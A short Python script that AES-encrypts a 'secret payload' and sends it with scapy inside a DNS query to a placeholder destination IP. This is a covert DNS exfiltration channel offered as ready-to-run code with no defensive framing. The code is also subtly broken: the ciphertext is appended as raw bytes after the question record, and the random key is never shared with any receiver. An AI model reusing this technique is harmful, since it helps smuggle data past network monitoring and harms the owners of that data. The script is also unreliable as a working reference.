from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from scapy.all import *

# AES encryption function
def encrypt_payload(key, payload):
    '''
    Encrypts the payload using AES-128-CBC.
    Returns the IV and the ciphertext.
    '''
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(payload.encode(), AES.block_size))
    return cipher.iv + ciphertext

def send_dns_packet(domain, secret_payload, key):
    '''
    Sends a DNS packet with the encrypted secret payload.
    '''
    destination_ip = "Destination_IP_Address"
    destination_port = 53

    # Encrypt the payload using AES
    encrypted_payload = encrypt_payload(key, secret_payload)

    # Craft the DNS packet with the encrypted secret payload
    dns_packet = IP(dst=destination_ip) / UDP(dport=destination_port) / DNS(rd=1, qd=DNSQR(qname=domain, qtype="A") / encrypted_payload)

    # Send the DNS packet
    send(dns_packet)

if __name__ == "__main__":
    domain_name = "example.com"
    secret_data = "This is a secret payload!"
    aes_key = get_random_bytes(16)  # 16 bytes key for AES-128

    send_dns_packet(domain_name, secret_data, aes_key)
